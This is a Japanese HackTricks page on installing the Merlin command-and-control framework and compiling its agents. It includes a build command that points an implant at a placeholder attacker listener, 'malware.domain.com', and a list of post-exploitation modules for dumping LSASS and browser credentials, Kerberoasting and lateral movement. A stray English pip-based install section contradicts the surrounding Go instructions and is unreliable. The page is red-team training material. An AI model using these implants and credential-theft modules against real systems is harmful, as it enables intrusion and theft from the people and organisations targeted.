<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>


# インストール

## GOをインストール
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Merlinのインストール

Install Merlin by following these steps:

1. Clone the Merlin repository from GitHub:
```bash
git clone https://github.com/username/merlin.git
```

2. Change into the Merlin directory:
```bash
cd merlin
```

3. Install the required dependencies using pip:
```bash
pip install -r requirements.txt
```

4. Run Merlin:
```bash
python merlin.py
```

Now you have successfully installed Merlin on your system.
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Merlinサーバーの起動
```
go run cmd/merlinserver/main.go -i
```
# マーリン エージェント

[事前にコンパイルされたエージェントをダウンロード](https://github.com/Ne0nd0g/merlin/releases)できます。

## エージェントのコンパイル

メインフォルダー _$GOPATH/src/github.com/Ne0nd0g/merlin/_ に移動します。
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **マニュアルコンパイルエージェント**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# モジュール

**悪いニュースは、Merlinが使用するすべてのモジュールがソース（Github）からダウンロードされ、ディスクに保存されることです。よく知られたモジュールを使用する際には注意してください。Windows Defenderに検出される可能性があります！**


**SafetyKatz** --> 改変されたMimikatz。LSASSをファイルにダンプして、:sekurlsa::logonpasswordsをそのファイルに実行します\
**SharpDump** --> 指定されたプロセスIDのminidump（デフォルトではLSASS）（最終ファイルの拡張子は.gzですが、実際には.binですが、.gzファイルです）\
**SharpRoast** --> Kerberoast（動作しません）\
**SeatBelt** --> CSのローカルセキュリティテスト（動作しません）https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafeを使用してコンパイル\
**Sharp-Up** --> PowerupでC#のすべてのチェックを実行します（動作します）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNSのスプーファーおよび中間者ツール（動作しません、読み込みが必要：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
**Invoke-InternalMonologue** --> 利用可能なすべてのユーザーを偽装し、各ユーザーのチャレンジレスポンスを取得します（各ユーザーのNTLMハッシュ）（悪いURL）\
**Invoke-PowerThIEf** --> IExplorerからフォームを盗み出すか、JSを実行するか、そのプロセスにDLLをインジェクトします（動作しません）（およびPSも動作しないようです）https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ブラウザのパスワードを取得します（機能しますが、出力ディレクトリを表示しません）\
**dumpCredStore** --> Win32資格情報マネージャAPI（https://github.com/zetlen/clortho/blob/master/CredMan.ps1）https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 実行中のプロセスでクラシックインジェクションを検出します（Classic Injection（OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread））（動作しません）\
**Get-OSTokenInformation** --> 実行中のプロセスとスレッドのトークン情報を取得します（ユーザー、グループ、特権、所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
**Invoke-DCOM** --> DCOM経由で（他のコンピューターで）コマンドを実行します（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COMオブジェクト（ADDin）を悪用して他のPCでコマンドを実行します\
**Invoke-ExcelMacroPivot** --> ExcelのDCOMを悪用して他のPCでコマンドを実行します\
**Find-ComputersWithRemoteAccessPolicies** --> （動作しません）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> グループポリシーの最も興味深い部分をすべてダンプし、それらを検索して攻撃可能なものを探します（非推奨）Grouper2を見てみてください、本当に素敵です\
**Invoke-WMILM** --> 横断移動のためのWMI\
**Get-GPPPassword** --> groups.xml、scheduledtasks.xml、services.xml、datasources.xmlを検索して平文パスワードを返します（ドメイン内）\
**Invoke-Mimikatz** --> Mimikatzを使用します（デフォルトのクレデンシャルをダンプ）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> コンピューターのユーザーの特権をチェックします\
**Find-PotentiallyCrackableAccounts** --> SPNに関連付けられたユーザーアカウントに関する情報を取得します（Kerberoasting）\
**psgetsystem** --> getsystem

**持続性モジュールはチェックしていません**

# 要約

このツールの感触とポテンシャルが本当に気に入っています。\
ツールがサーバーからモジュールをダウンロードし始め、スクリプトをダウンロードする際に回避機能を統合することを期待しています。
